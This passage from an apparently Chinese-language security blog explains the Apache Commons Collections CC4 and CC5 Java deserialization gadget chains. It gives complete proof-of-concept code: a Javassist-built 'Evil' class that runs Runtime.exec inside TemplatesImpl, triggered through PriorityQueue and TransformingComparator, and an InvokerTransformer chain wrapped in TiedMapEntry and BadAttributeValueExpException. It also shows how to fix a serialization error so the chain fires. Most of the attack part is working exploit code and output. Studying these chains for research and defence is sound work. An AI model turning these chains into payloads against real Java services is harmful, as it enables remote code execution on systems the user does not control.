class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">TrAXFilter<br>Templates<br>TemplatesImpl<br>InstantiateTransformer <span class="hljs-regexp">//</span>替换InvokerTransformer<br><br>ClassPool<br>CtClass<br>AbstractTranslet<br><br>Transformer<br>ConstantTransformer<br>ChainedTransformer<br><br>HashMap<br>LazyMap<br><br>AnnotationInvocationHandler<br>Proxy<br></code></pre></td></tr></table></figure><p>CC4 是 CC2+CC3 的变体，by the way，seebug 里面的 poc 我感觉是贴错了 CC2 的</p><p>在 CC2 的利用背景下，改进 PriorityQueue 利用链：因为 CommonsCollections4 除 4.0 的其他版本去掉了 <code>InvokerTransformer</code>的 Serializable 继承，导致无法序列化所以便有了 CC4，CC4 只是将 CC2 中的 <code>InvokerTransformer</code>替换为了<code>InstantiateTransformer</code></p><h3 id="Gadget-3"><a href="#Gadget-3" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC4;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC4</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object o, String fieldName, Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredFiled = clz.getDeclaredField(fieldName);<br>            declaredFiled.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredFiled.set(o, value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        ctc.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br>        TemplatesImpl templatesimpl = <span class="hljs-keyword">new</span> TemplatesImpl();<br><br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetclassbytes);<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templatesimpl&#125;),<br>        &#125;);<br><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue();<br><span class="hljs-comment">//        PriorityQueue queue = new PriorityQueue(2,transformingComparator);</span><br>        setFieldValue(queue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        setFieldValue(queue,<span class="hljs-string">&quot;comparator&quot;</span>,transformingComparator);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里发现<code>new PriorityQueue(1)</code>后再反射设置了<code>size=2</code>，却并没有触发，有如下报错</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Exception <span class="hljs-keyword">in</span> thread <span class="hljs-string">&quot;main&quot;</span> java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.ArrayIndexOutOfBoundsException</span>: <span class="hljs-number">1</span><br>at java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.PriorityQueue</span><span class="hljs-selector-class">.writeObject</span>(PriorityQueue<span class="hljs-selector-class">.java</span>:<span class="hljs-number">770</span>)<br>at sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke0</span>(Native Method)<br>at sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span>(NativeMethodAccessorImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">62</span>)<br>at sun<span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.DelegatingMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span>(DelegatingMethodAccessorImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">43</span>)<br>at java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span>(Method<span class="hljs-selector-class">.java</span>:<span class="hljs-number">497</span>)<br>at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectStreamClass</span><span class="hljs-selector-class">.invokeWriteObject</span>(ObjectStreamClass<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1028</span>)<br>at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectOutputStream</span><span class="hljs-selector-class">.writeSerialData</span>(ObjectOutputStream<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1496</span>)<br>at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectOutputStream</span><span class="hljs-selector-class">.writeOrdinaryObject</span>(ObjectOutputStream<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1432</span>)<br>at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectOutputStream</span><span class="hljs-selector-class">.writeObject0</span>(ObjectOutputStream<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1178</span>)<br>at java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectOutputStream</span><span class="hljs-selector-class">.writeObject</span>(ObjectOutputStream<span class="hljs-selector-class">.java</span>:<span class="hljs-number">348</span>)<br>at CommonsCollections<span class="hljs-selector-class">.CC4</span><span class="hljs-selector-class">.CC4</span><span class="hljs-selector-class">.main</span>(CC4<span class="hljs-selector-class">.java</span>:<span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure><p>但在 CC2 中提到</p><blockquote><p>PriorityQueue 构造方法为什么传入(1)，也可以传入(1,transformingComparator)后 add 两次，或者反射不传入参数都可以触发</p></blockquote><p>我们注意到 CC2 中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java">        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>        Object[] queue_array =<span class="hljs-keyword">new</span> Object[] &#123;templatesimpl, <span class="hljs-number">1</span>&#125;;<br><br>        setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,queue_array);<br>        setFieldValue(queue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>--------------------------------------------------------------------------------------------------------<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>(DEFAULT_INITIAL_CAPACITY, <span class="hljs-keyword">null</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>(initialCapacity, <span class="hljs-keyword">null</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity,</span></span><br><span class="hljs-params"><span class="hljs-function">                         Comparator&lt;? <span class="hljs-keyword">super</span> E&gt; comparator)</span> </span>&#123;<br>        <span class="hljs-comment">// Note: This restriction of at least one is not actually needed,</span><br>        <span class="hljs-comment">// but continues for 1.5 compatibility</span><br>        <span class="hljs-keyword">if</span> (initialCapacity &lt; <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException();<br>        <span class="hljs-keyword">this</span>.queue = <span class="hljs-keyword">new</span> Object[initialCapacity];<br>        <span class="hljs-keyword">this</span>.comparator = comparator;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException </span>&#123;<br>        <span class="hljs-comment">// Write out element count, and any hidden stuff</span><br>        s.defaultWriteObject();<br><br>        <span class="hljs-comment">// Write out array length, for compatibility with 1.5 version</span><br>        s.writeInt(Math.max(<span class="hljs-number">2</span>, size + <span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">// Write out all elements in the &quot;proper order&quot;.</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>            s.writeObject(queue[i]);<br>    &#125;<br></code></pre></td></tr></table></figure><p>是等价于直接<code>new PriorityQueue(2)</code>的，<code>PriorityQueue.queue[2]</code>，序列化时是不会报数组越界的</p><p>CC4 这里<code>initialCapacity</code>设置 1，却没有反射修改<code>queue[]</code>，于是在<code>PriorityQueue.writeObject</code>出现数组越界(为什么通过反射修改<code>size</code>在 CC2 中有说明)，不调试了，直接反射改 queue 数组看看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">      PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> Object[<span class="hljs-number">2</span>]);<br></code></pre></td></tr></table></figure><p>验证成功</p><h2 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h2><h3 id="Pre-4"><a href="#Pre-4" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-4"><a href="#限制-4" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 3.1 - 3.2.1</p></blockquote><h4 id="利用链-4"><a href="#利用链-4" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BadAttributeValueExpException</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h4 id="关键类-4"><a href="#关键类-4" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">BadAttributeValueExpException</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br></code></pre></td></tr></table></figure><h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h4><p>CC5 是改造了 CC1，CC1 中<code>LazyMap.get</code>找不到值调用<code>transform</code>方法从而 RCE；CC5 用了<code>TiedMapEntry.toString</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> </span>&#123;<br>       <span class="hljs-keyword">super</span>();<br>       <span class="hljs-keyword">this</span>.map = map;<br>       <span class="hljs-keyword">this</span>.key = key;<br>   &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>       <span class="hljs-keyword">return</span> getKey() + <span class="hljs-string">&quot;=&quot;</span> + getValue();<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getValue</span><span class="hljs-params">()</span> </span>&#123;<br>       <span class="hljs-keyword">return</span> map.get(key);<br>   &#125;<br></code></pre></td></tr></table></figure><p>可见<code>map key</code>均可控，所以此处设置 map 为 CC1 中的<code>LazyMap</code>就能 RCE 了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC5;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-number">1</span>);<br>        tiedMapEntry.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h4><p>如何去调用<code>TiedMapEntry.toString</code>并且序列化呢，为了不受 jdk 版本限制，CC5 使用了<code>BadAttributeValueExpException</code>类</p><p><a href="https://www.anquanke.com/post/id/190468#h3-3">https://www.anquanke.com/post/id/190468#h3-3</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BadAttributeValueExpException</span> <span class="hljs-params">(Object val)</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>.val = val == <span class="hljs-keyword">null</span> ? <span class="hljs-keyword">null</span> : val.toString();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>    ObjectInputStream.GetField gf = ois.readFields();<br>    Object valObj = gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>    <span class="hljs-keyword">if</span> (valObj == <span class="hljs-keyword">null</span>) &#123;<br>        val = <span class="hljs-keyword">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>        val= valObj;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-keyword">null</span><br>            || valObj <span class="hljs-keyword">instanceof</span> Long<br>            || valObj <span class="hljs-keyword">instanceof</span> Integer<br>            || valObj <span class="hljs-keyword">instanceof</span> Float<br>            || valObj <span class="hljs-keyword">instanceof</span> Double<br>            || valObj <span class="hljs-keyword">instanceof</span> Byte<br>            || valObj <span class="hljs-keyword">instanceof</span> Short<br>            || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;<br>        val = valObj.toString();<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>        val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接构造的话会直接触发</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(tiedMapEntry);<br></code></pre></td></tr></table></figure><p>因此通过反射修改来规避触发</p><h3 id="Gadget-4"><a href="#Gadget-4" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC5;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> 